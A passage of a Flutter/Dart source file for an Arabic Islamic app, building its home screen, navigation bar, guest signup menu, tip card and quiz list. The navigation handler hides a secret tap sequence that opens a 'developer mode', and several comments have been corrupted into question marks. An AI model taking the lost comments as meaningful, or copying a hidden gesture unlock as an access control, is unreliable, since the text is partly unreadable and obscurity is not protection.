            fontSize: 15,
          ),
        ),
        subtitle: Text(
          subtitle,
          style: TextStyle(
            color: Color.fromRGBO(255, 255, 255, 0.5),
            fontSize: 12,
          ),
        ),
        trailing: Icon(
          Icons.arrow_forward_ios,
          color: Color.fromRGBO(255, 255, 255, 0.5),
          size: 16,
        ),
        onTap: onTap,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      key: _scaffoldKey,
      drawer: _buildDrawer(),
      body: _currentIndex == 0
          ? TribesScreen(user: _currentUser)
          : Container(
              color: Colors.black,
              child: Stack(
                children: [
                  // خلفية الشخصية الملكية الإضافية أو الملائكية
                  Positioned(
                    top: 80, // التموضع في الخلفية
                    left: 0,
                    right: 0,
                    child: AnimatedBuilder(
                      animation: _angelFloatAnimation,
                      builder: (context, child) {
                        return Transform.translate(
                          offset: Offset(0, _angelFloatAnimation.value),
                          child: Opacity(
                            opacity: 0.6, // شفافية عالية لمظهر خفي وغامض
                            child: Image.asset(
                              'assets/images/angelic_figure.png',
                              height: 350, // طول الصورة
                              fit: BoxFit.contain,
                            ),
                          ),
                        );
                      },
                    ),
                  ),

                  // المحتوى الرئيسي فوق الخلفية
                  SafeArea(
                    child: Column(
                      children: [
                        // شريط العناوين في أعلى الصفحة
                        Padding(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 16,
                            vertical: 12,
                          ),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              // زر القائمة (3 شرط)
                              IconButton(
                                onPressed: () {
                                  _scaffoldKey.currentState?.openDrawer();
                                },
                                icon: const Icon(
                                  Icons.menu,
                                  color: Colors.white,
                                  size: 28,
                                ),
                              ),
                              // عنوان الصفحة
                              Expanded(
                                child: Center(
                                  child: Text(
                                    _getPageTitle(),
                                    style: const TextStyle(
                                      color: Colors.white,
                                      fontSize: 20,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                ),
                              ),

                              // زر تسجيل سريع (يظهر للزوار فقط)
                              if (_currentUser['id'] == 'guest')
                                PopupMenuButton<String>(
                                  onSelected: (value) {
                                    if (value == 'quick') {
                                      _createGuestAccount();
                                    } else if (value == 'login') {
                                      _navigateToLogin();
                                    }
                                  },
                                  offset: const Offset(0, 45),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(16),
                                  ),
                                  color: const Color(0xFF1E1E3F),
                                  itemBuilder: (context) => [
                                    PopupMenuItem<String>(
                                      value: 'quick',
                                      child: Row(
                                        children: [
                                          Container(
                                            padding: const EdgeInsets.all(8),
                                            decoration: BoxDecoration(
                                              color: const Color(
                                                0xFF4CAF50,
                                              ).withValues(alpha: 0.2),
                                              borderRadius:
                                                  BorderRadius.circular(8),
                                            ),
                                            child: const Icon(
                                              Icons.flash_on_rounded,
                                              color: Color(0xFF4CAF50),
                                              size: 20,
                                            ),
                                          ),
                                          const SizedBox(width: 12),
                                          const Column(
                                            crossAxisAlignment:
                                                CrossAxisAlignment.start,
                                            children: [
                                              Text(
                                                'تسجيل سريع',
                                                style: TextStyle(
                                                  color: Colors.white,
                                                  fontWeight: FontWeight.bold,
                                                  fontSize: 14,
                                                ),
                                              ),
                                              Text(
                                                'إنشاء حساب ضيف فوري',
                                                style: TextStyle(
                                                  color: Colors.white54,
                                                  fontSize: 11,
                                                ),
                                              ),
                                            ],
                                          ),
                                        ],
                                      ),
                                    ),
                                    const PopupMenuDivider(),
                                    PopupMenuItem<String>(
                                      value: 'login',
                                      child: Row(
                                        children: [
                                          Container(
                                            padding: const EdgeInsets.all(8),
                                            decoration: BoxDecoration(
                                              color: const Color(
                                                0xFF2196F3,
                                              ).withValues(alpha: 0.2),
                                              borderRadius:
                                                  BorderRadius.circular(8),
                                            ),
                                            child: const Icon(
                                              Icons.login_rounded,
                                              color: Color(0xFF2196F3),
                                              size: 20,
                                            ),
                                          ),
                                          const SizedBox(width: 12),
                                          const Column(
                                            crossAxisAlignment:
                                                CrossAxisAlignment.start,
                                            children: [
                                              Text(
                                                'تسجيل الدخول',
                                                style: TextStyle(
                                                  color: Colors.white,
                                                  fontWeight: FontWeight.bold,
                                                  fontSize: 14,
                                                ),
                                              ),
                                              Text(
                                                'لديك حساب مسبق؟',
                                                style: TextStyle(
                                                  color: Colors.white54,
                                                  fontSize: 11,
                                                ),
                                              ),
                                            ],
                                          ),
                                        ],
                                      ),
                                    ),
                                  ],
                                  child: Container(
                                    margin: const EdgeInsets.only(left: 8),
                                    padding: const EdgeInsets.symmetric(
                                      horizontal: 12,
                                      vertical: 8,
                                    ),
                                    decoration: BoxDecoration(
                                      gradient: const LinearGradient(
                                        colors: [
                                          Color(0xFFB388FF),
                                          Color(0xFF9C27B0),
                                        ],
                                      ),
                                      borderRadius: BorderRadius.circular(12),
                                      boxShadow: [
                                        BoxShadow(
                                          color: const Color(
                                            0xFFB388FF,
                                          ).withValues(alpha: 0.3),
                                          blurRadius: 8,
                                          spreadRadius: 1,
                                        ),
                                      ],
                                    ),
                                    child: const Row(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        Icon(
                                          Icons.person_add_alt_1_rounded,
                                          color: Colors.white,
                                          size: 18,
                                        ),
                                        SizedBox(width: 6),
                                        Text(
                                          'تسجيل سريع',
                                          style: TextStyle(
                                            color: Colors.white,
                                            fontSize: 13,
                                            fontWeight: FontWeight.bold,
                                          ),
                                        ),
                                        SizedBox(width: 4),
                                        Icon(
                                          Icons.arrow_drop_down,
                                          color: Colors.white70,
                                          size: 18,
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                            ],
                          ),
                        ),

                        // قسم الصفحة الحالية
                        Expanded(
                          child: Container(
                            width: double.infinity,
                            decoration: BoxDecoration(
                              color: Colors.black, // خلفية سوداء للمحتوى
                              borderRadius: const BorderRadius.only(
                                topLeft: Radius.circular(30),
                                topRight: Radius.circular(30),
                              ),
                              border: Border.all(
                                color: Color.fromRGBO(107, 92, 231, 0.3),
                                width: 1,
                              ),
                            ),

                            child: ClipRRect(
                              borderRadius: const BorderRadius.only(
                                topLeft: Radius.circular(30),
                                topRight: Radius.circular(30),
                              ),
                              child: _buildCurrentPage(),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
      bottomNavigationBar: _buildBottomNav(),
    );
  }

  Widget _buildBottomNav() {
    return Container(
      margin: const EdgeInsets.fromLTRB(
        16,
        0,
        16,
        20,
      ), // الهامش حول شريط التنقل
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12),
      decoration: BoxDecoration(
        color: Colors.black, // لون داكن
        borderRadius: BorderRadius.circular(32),
        border: Border.all(
          color: AppTheme.accentSilverGold.withAlpha(100),
          width: 1.5,
        ), // إطار خفيف
        boxShadow: [
          BoxShadow(
            color: AppTheme.accentSilverGold.withAlpha(30), // توهج ذهبي خفيف
            blurRadius: 20,
            spreadRadius: 2,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _buildNavItem(3, Icons.quiz_outlined, Icons.quiz_rounded, 'اختبارات'),
          _buildNavItem(
            2,
            Icons.auto_stories_outlined,
            Icons.auto_stories_rounded,
            'أذكاري',
          ),
          _buildNavItem(1, Icons.home_outlined, Icons.home_rounded, 'الرئيسية'),
          _buildNavItem(
            0,
            Icons.chat_bubble_outline_rounded,
            Icons.chat_bubble_rounded,
            'القبائل',
          ),
          _buildNavItem(
            4,
            Icons.mic_none_rounded,
            Icons.mic_rounded,
            'غرف صوتية',
          ),
        ],
      ),
    );
  }

  Widget _buildNavItem(
    int index,
    IconData icon,
    IconData activeIcon,
    String label,
  ) {
    final isActive = index == _currentIndex;

    return GestureDetector(
      onTap: () {
        // لمسة سرية لوحة الأهل: أذكاري(3) و الرئيسية(2) و اختبارات(3)
        // يتم تتبع ترتيب الضغطات هنا للتحقق من التسلسل
        final now = DateTime.now();

        // التحقق من انتهاء مهلة الـ 15 ثانية بين النقر
        if (_lastSecretTap != null &&
            now.difference(_lastSecretTap!).inSeconds > 15) {
          _resetSecretSequence();
          debugPrint('تم تجاوز المهلة (15 ثانية) - إعادة الترتيب');
        }
        _lastSecretTap = now;

        // ??????? 1: ?????? (3 ?????) - ???? ???????
        if (index == 2) {
          // ??????
          if (_secretStep == 0) {
            _adhkarTapCount++;
            debugPrint('تم النقر على أذكاري: $_adhkarTapCount/3');
            if (_adhkarTapCount >= 3) {
              _secretStep = 1;
              _adhkarTapCount = 0;
              debugPrint('تمت الخطوة الأولى بنجاح! انتقل إلى الرئيسية');
            }
          } else {
            // ترتيب خاطئ - إعادة المحاولة
            _resetSecretSequence();
            debugPrint('ترتيب خاطئ! إعادة المحاولة');
          }
        }
        // ??????? 2: ???????? (2 ?????)
        else if (index == 1) {
          // ????????
          if (_secretStep == 1) {
            _homeTapCount++;
            debugPrint('تم النقر على الرئيسية: $_homeTapCount/2');
            if (_homeTapCount >= 2) {
              _secretStep = 2;
              _homeTapCount = 0;
              debugPrint(
                'تمت الخطوة الثانية بنجاح! انقر على الاختبارات 3 مرات',
              );
            }
          } else if (_secretStep > 0) {
            // ترتيب خاطئ - إعادة المحاولة
            _resetSecretSequence();
            debugPrint('ترتيب خاطئ! إعادة المحاولة');
          }
          // ??? _secretStep == 0? ?? ???? ??? (?? ???? ??????? ???)
        }
        // ??????? 3: ???????? (3 ?????)
        else if (index == 3) {
          // ????????
          if (_secretStep == 2) {
            _quizTapCount++;
            debugPrint('تم النقر على الاختبارات: $_quizTapCount/3');
            if (_quizTapCount >= 3) {
              debugPrint('تم الدخول إلى وضع المطور!');
              _resetSecretSequence();
              _showTerminalAnimation();
              return;
            }
          } else if (_secretStep > 0) {
            // ترتيب خاطئ - إعادة المحاولة
            _resetSecretSequence();
            debugPrint('ترتيب خاطئ! إعادة المحاولة');
          }
          // ??? _secretStep == 0? ?? ???? ??? (?? ???? ??????? ???)
        }
        // ?? ???????? (index 0)
        else {
          if (_secretStep > 0) {
            // ترتيب خاطئ - إعادة المحاولة
            _resetSecretSequence();
            debugPrint('ترتيب خاطئ! إعادة المحاولة');
          }
        }

        setState(() => _currentIndex = index);
      },
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          AnimatedContainer(
            duration: const Duration(milliseconds: 300),
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: isActive
                  ? const Color(0xFFD4AF37).withAlpha(40) // ???? ????
                  : Colors.transparent,
              borderRadius: BorderRadius.circular(16),
              border: isActive
                  ? Border.all(
                      color: const Color(
                        0xFFD4AF37,
                      ).withAlpha(150), // ???? ?????
                      width: 1,
                    )
                  : null,
              boxShadow: isActive
                  ? [
                      BoxShadow(
                        color: const Color(0xFFD4AF37).withAlpha(50),
                        blurRadius: 15,
                        spreadRadius: 1,
                      ),
                    ]
                  : null,
            ),
            child: Icon(
              isActive ? activeIcon : icon,
              color: isActive
                  ? const Color(0xFFD4AF37)
                  : Colors.grey[600], // ???? ?????? ????? ??????
              size: 26,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            label,
            style: TextStyle(
              fontSize: 11,
              fontWeight: isActive ? FontWeight.w900 : FontWeight.normal,
              color: isActive ? Colors.white : Colors.grey[600],
            ),
          ),
        ],
      ),
    );
  }

  String _getPageTitle() {
    switch (_currentIndex) {
      case 0:
        return 'القبائل';
      case 1:
        return 'الرئيسية';
      case 2:
        return 'أذكاري';
      case 3:
        return 'اختبارات';
      case 4:
        return 'غرف صوتية';
      default:
        return 'الرئيسية';
    }
  }

  Widget _buildCurrentPage() {
    switch (_currentIndex) {
      case 1:
        return _buildHomePage();
      case 2:
        return _buildAdhkarPage();
      case 3:
        return _buildQuizPage();
      case 4:
        return VoiceRoomsScreen(user: widget.user);
      default:
        return _buildHomePage();
    }
  }

  // ???? ???????? - ????? ?????? ?
  Widget _buildHomePage() {
    return Container(
      color: Colors.black,
      child: Stack(
        children: [
          // ??????? ???????
          SingleChildScrollView(
            physics: const BouncingScrollPhysics(),
            padding: const EdgeInsets.all(20),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // ????? ??????? ?????????
                _buildWelcomeCard(),
                const SizedBox(height: 24),

                // ??? ??????????
                _buildStatsSection(),
                const SizedBox(height: 24),

                // ?????? ??????
                _buildQuickAccessSection(),
                const SizedBox(height: 24),

                // ????? ?????
                _buildDailyTipCard(),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildWelcomeCard() {
    return Container(
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            Color(0xFF8B0000), // ???? ???? ????
            Color(0xFFFF0000), // ???? ??????? ????
            Color(0xFF8B0000), // ???? ???? ????
          ],
        ),
        borderRadius: BorderRadius.circular(28),
        border: Border.all(
          color: const Color(0xFFFFD700).withAlpha(150),
          width: 2,
        ),
        boxShadow: [
          BoxShadow(
            color: const Color(0xFFFF0000).withAlpha(60),
            blurRadius: 20,
            spreadRadius: 2,
            offset: const Offset(0, 5),
          ),
          BoxShadow(
            color: const Color(0xFFFFD700).withAlpha(40),
            blurRadius: 30,
            offset: const Offset(0, 10),
          ),
        ],
      ),
      child: Row(
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'مرحباً بك، ${_currentUser['name'] ?? 'مستخدم'} 👋',
                  style: const TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  'نتمنى لك يوماً مليئاً بذكر الله وطاعته... 🌹',
                  style: TextStyle(
                    fontSize: 14,
                    color: Color.fromRGBO(255, 255, 255, 0.7),
                  ),
                ),
              ],
            ),
          ),
          Container(
            width: 70,
            height: 70,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: Color.fromRGBO(255, 255, 255, 0.5),
              border: Border.all(
                color: Color.fromRGBO(255, 255, 255, 0.5),
                width: 2,
              ),
              image: _currentUser['profile_image'] != null
                  ? DecorationImage(
                      image: NetworkImage(_currentUser['profile_image']),
                      fit: BoxFit.cover,
                    )
                  : null,
            ),
            child: _currentUser['profile_image'] == null
                ? const Icon(Icons.person, color: Colors.white, size: 35)
                : null,
          ),
        ],
      ),
    );
  }

  Widget _buildStatsSection() {
    return Row(
      children: [
        // زر الأخبار
        Expanded(
          child: GestureDetector(
            onTap: () {
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => NewsScreen(userId: _currentUser['id']),
                ),
              );
            },
            child: Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    Color(0xFFFF6B6B),
                    Color(0xFFFF8E53),
                    Color(0xFFFF6B6B),
                  ],
                  stops: [0.0, 0.5, 1.0],
                ),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(
                  color: Colors.white.withValues(alpha: 0.3),
                  width: 2,
                ),
                boxShadow: [
                  BoxShadow(
                    color: const Color(0xFFFF6B6B).withValues(alpha: 0.4),
                    blurRadius: 20,
                    spreadRadius: 1,
                    offset: const Offset(0, 6),
                  ),
                ],
              ),
              child: Column(
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: Colors.white.withValues(alpha: 0.2),
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(
                        color: Colors.white.withValues(alpha: 0.3),
                        width: 1.5,
                      ),
                    ),
                    child: const Icon(
                      Icons.newspaper,
                      size: 36,
                      color: Colors.white,
                    ),
                  ),
                  const SizedBox(height: 12),
                  const Text(
                    '📰 الأخبار',
                    style: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      shadows: [
                        Shadow(
                          color: Colors.black26,
                          offset: Offset(0, 2),
                          blurRadius: 4,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 6),
                  Text(
                    'آخر التحديثات',
                    style: TextStyle(
                      fontSize: 12,
                      color: Colors.white.withValues(alpha: 0.85),
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ),
        ),
        const SizedBox(width: 12),
        // زر اسئلني
        Expanded(
          child: GestureDetector(
            onTap: () {
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => AskMeScreen(userId: _currentUser['id']),
                ),
              );
            },
            child: Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    Color(0xFF4CAF50),
                    Color(0xFF66BB6A),
                    Color(0xFF4CAF50),
                  ],
                  stops: [0.0, 0.5, 1.0],
                ),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(
                  color: Colors.white.withValues(alpha: 0.3),
                  width: 2,
                ),
                boxShadow: [
                  BoxShadow(
                    color: const Color(0xFF4CAF50).withValues(alpha: 0.4),
                    blurRadius: 20,
                    spreadRadius: 1,
                    offset: const Offset(0, 6),
                  ),
                ],
              ),
              child: Column(
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: Colors.white.withValues(alpha: 0.2),
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(
                        color: Colors.white.withValues(alpha: 0.3),
                        width: 1.5,
                      ),
                    ),
                    child: const Icon(
                      Icons.question_answer,
                      size: 36,
                      color: Colors.white,
                    ),
                  ),
                  const SizedBox(height: 12),
                  const Text(
                    '💬 اسئلني',
                    style: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      shadows: [
                        Shadow(
                          color: Colors.black26,
                          offset: Offset(0, 2),
                          blurRadius: 4,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 6),
                  Text(
                    'أسئلة وأجوبة',
                    style: TextStyle(
                      fontSize: 12,
                      color: Colors.white.withValues(alpha: 0.85),
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildQuickAccessSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text(
          '🚀 الوصول السريع',
          style: TextStyle(
            fontSize: 20,
            fontWeight: FontWeight.bold,
            color: Colors.white,
          ),
        ),
        const SizedBox(height: 16),
        SingleChildScrollView(
          scrollDirection: Axis.horizontal,
          physics: const BouncingScrollPhysics(),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              _buildQuickAccessButton(
                icon: Icons.chat_bubble_rounded,
                label: 'القبائل',
                color: AppTheme.accentGreen,
                onTap: () => setState(() => _currentIndex = 0),
              ),
              const SizedBox(width: 12),
              _buildQuickAccessButton(
                icon: Icons.auto_stories,
                label: 'الأذكار',
                color: AppTheme.accentPurple,
                onTap: () => setState(() => _currentIndex = 2),
              ),

              const SizedBox(width: 12),
              // التنشيط الفوري من الواجهة
              _buildQuickAccessButton(
                icon: Icons.touch_app,
                label: 'التسبيح',
                color: const Color(0xFFDC143C),
                isGlowing: true,
                onTap: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(builder: (_) => const TasbihScreen()),
                  );
                },
              ),
              const SizedBox(width: 12),
              _buildQuickAccessButton(
                icon: Icons.explore,
                label: 'القبلة',
                color: const Color(0xFF00FF41),
                isGlowing: true,
                onTap: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (_) => QiblaScreen(userId: _currentUser['id']),
                    ),
                  );
                },
              ),
              const SizedBox(width: 12),
              _buildQuickAccessButton(
                icon: Icons.question_answer_rounded,
                label: 'اسئلني',
                color: const Color(0xFF4CAF50),
                isGlowing: true,
                onTap: () async {
                  // تطبيق قيود الزائر
                  final canAccess = await GuestModeService.requireLogin(
                    context,
                    'استخدام خدمة اسئلني',
                  );
                  if (!canAccess) return;
                  if (!mounted) return;

                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (_) => AskMeScreen(userId: _currentUser['id']),
                    ),
                  );
                },
              ),
              const SizedBox(width: 12),
              _buildQuickAccessButton(
                icon: Icons.quiz,
                label: 'الاختبارات',
                color: AppTheme.accentSilverGold,
                onTap: () => setState(() => _currentIndex = 3),
              ),
              const SizedBox(width: 12),
              _buildQuickAccessButton(
                icon: Icons.person,
                label: 'الملف الشخصي',
                color: AppTheme.accentGold,
                onTap: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (_) => ProfileScreen(
                        user: _currentUser,
                        onUserUpdated: _updateUser,
                      ),
                    ),
                  );
                },
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildQuickAccessButton({
    required IconData icon,
    required String label,
    required Color color,
    required VoidCallback onTap,
    bool isGlowing = false,
  }) {
    // تأثير التوهج في النبض يحتاج AnimatedBuilder كالعادة
    if (isGlowing) {
      return AnimatedBuilder(
        animation: _glowAnimation,
        builder: (context, child) {
          final glowValue = _glowAnimation.value;
          return InkWell(
            onTap: onTap,
            borderRadius: BorderRadius.circular(16),
            child: Container(
              width: 100,
              padding: const EdgeInsets.symmetric(vertical: 20, horizontal: 12),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    Color.fromRGBO(
                      (color.r * 255).round(),
                      (color.g * 255).round(),
                      (color.b * 255).round(),
                      0.15 + (glowValue * 0.25),
                    ),
                    Color.fromRGBO(
                      (color.r * 255).round(),
                      (color.g * 255).round(),
                      (color.b * 255).round(),
                      0.05 + (glowValue * 0.15),
                    ),
                  ],
                ),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.black, width: 2.5),
                boxShadow: [
                  BoxShadow(
                    color: Color.fromRGBO(
                      (color.r * 255).round(),
                      (color.g * 255).round(),
                      (color.b * 255).round(),
                      0.3 + (glowValue * 0.5),
                    ),
                    blurRadius: 15 + (glowValue * 20),
                    spreadRadius: 1 + (glowValue * 5),
                  ),
                ],
              ),
              child: Column(
                children: [
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: color,
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: Color.fromRGBO(
                            (color.r * 255).round(),
                            (color.g * 255).round(),
                            (color.b * 255).round(),
                            0.4 + (glowValue * 0.5),
                          ),
                          blurRadius: 10 + (glowValue * 20),
                          spreadRadius: glowValue * 5,
                          offset: const Offset(0, 4),
                        ),
                      ],
                    ),
                    child: Icon(icon, color: Colors.white, size: 22),
                  ),
                  const SizedBox(height: 10),
                  Text(
                    label,
                    style: TextStyle(
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                      color: color,
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      );
    }

    // التصميم العادي بدون توهج
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(16),
      child: Container(
        width: 100,
        padding: const EdgeInsets.symmetric(vertical: 20, horizontal: 12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color.fromRGBO(
                (color.r * 255).round(),
                (color.g * 255).round(),
                (color.b * 255).round(),
                0.15,
              ),
              Color.fromRGBO(
                (color.r * 255).round(),
                (color.g * 255).round(),
                (color.b * 255).round(),
                0.05,
              ),
            ],
          ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.black, width: 2.5),
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: color,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: Color.fromRGBO(
                      (color.r * 255).round(),
                      (color.g * 255).round(),
                      (color.b * 255).round(),
                      0.4,
                    ),
                    blurRadius: 10,
                    offset: const Offset(0, 4),
                  ),
                ],
              ),
              child: Icon(icon, color: Colors.white, size: 22),
            ),
            const SizedBox(height: 10),
            Text(
              label,
              style: TextStyle(
                fontSize: 11,
                fontWeight: FontWeight.w600,
                color: color,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDailyTipCard() {
    // النصيحة اليومية من السيرفر أو من القائمة الافتراضية
    final defaultTips = [
      {'emoji': '📖', 'tip': 'قراءة أذكار الصباح تفتح لك أبواب الخير...'},
      {'emoji': '📿', 'tip': 'الاستغفار يمحو الذنوب ويبعث في القلب الطمأنينة'},
      {'emoji': '🕌', 'tip': 'الصلاة على النبي تنير دربك في الدنيا والآخرة'},
      {'emoji': '✨', 'tip': 'سبحان الله وبحمده، سبحان الله العظيم'},
      {
        'emoji': '🤲',
        'tip': 'الدعاء هو العبادة، فلا تنسَ ساعة الاستجابة اليوم',
      },
    ];

    final String emoji;
    final String tipText;

    if (_activeTip != null) {
      emoji = _activeTip!['emoji'] ?? '💡';
      tipText =
          _activeTip!['tip'] ?? 'تذكر دائماً أن بذكر الله تطمئن القلوب...';
    } else {
      final defaultTip = defaultTips[DateTime.now().day % defaultTips.length];
      emoji = defaultTip['emoji']!;
      tipText = defaultTip['tip']!;
    }

    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            Color(0xFFFFFACD), // لون ليموني فاتح جداً
            Color(0xFFFFD700), // لون ذهبي
            Color(0xFFFFE135), // لون ذهبي مشع
          ],
          stops: [0.0, 0.5, 1.0],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: const Color(0xFFFFD700).withAlpha(120),
            blurRadius: 25,
            spreadRadius: 2,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.black.withAlpha(30),
              shape: BoxShape.circle,
              border: Border.all(color: Colors.black26, width: 1.5),
            ),
            child: Text(emoji, style: const TextStyle(fontSize: 28)),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  '💡 نصيحة اليوم',
                  style: TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    color: Colors.black87,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  tipText,
                  style: const TextStyle(
                    fontSize: 17,
                    fontWeight: FontWeight.bold,
                    color: Colors.black87,
                    height: 1.4,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // صفحة الاختبارات - تبويب رقم 3
  Widget _buildQuizPage() {
    if (_isLoadingQuizzes) {
      return Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF0A0E27), Color(0xFF1A1F4E)],
          ),
        ),
        child: const Center(
          child: CircularProgressIndicator(color: Color(0xFF6B5CE7)),
        ),
      );
    }

    if (_quizCategories.isEmpty) {
      return Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF0A0E27), Color(0xFF1A1F4E)],
          ),
        ),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: const Color(0xFF6B5CE7).withAlpha(30),
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: const Color(0xFF6B5CE7).withAlpha(50),
                    width: 2,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: const Color(0xFF6B5CE7).withAlpha(40),
                      blurRadius: 20,
                      spreadRadius: 5,
                    ),
                  ],
                ),
                child: const Text('❓', style: TextStyle(fontSize: 60)),
              ),
              const SizedBox(height: 24),
              const Text(
                'لا توجد اختبارات متاحة حالياً',
                style: TextStyle(
                  fontSize: 22,
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                'سيتم إضافة اختبارات جديدة قريباً... انتظرونا',
                style: TextStyle(
                  fontSize: 14,
                  color: Colors.white.withAlpha(100),
                ),
              ),
            ],
          ),
        ),
      );
    }

    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [Color(0xFF0A0E27), Color(0xFF1A1F4E)],
        ),
      ),
      child: Stack(
        children: [
          RefreshIndicator(
            onRefresh: _loadQuizCategories,
            color: const Color(0xFF6B5CE7),
            child: ShaderMask(
              shaderCallback: (Rect rect) {
                return const LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.transparent,
                    Colors.black,
                    Colors.black,
                    Colors.transparent,
                  ],
                  stops: [0.0, 0.05, 0.95, 1.0],
                ).createShader(rect);
              },
              blendMode: BlendMode.dstIn,
              child: ListView.builder(
                padding: const EdgeInsets.all(16),
                physics: const BouncingScrollPhysics(
                  parent: AlwaysScrollableScrollPhysics(),
                ),
                cacheExtent: 1500,
                itemCount: _quizCategories.length,
                itemBuilder: (context, index) {
                  final category = _quizCategories[index];
                  return RepaintBoundary(
                    child: _buildQuizCategoryCard(category),
                  );
                },
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildQuizCategoryCard(Map<String, dynamic> category) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            const Color(0xFF1A0A0A),
            const Color(0xFF2D1515).withAlpha(150),
          ],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
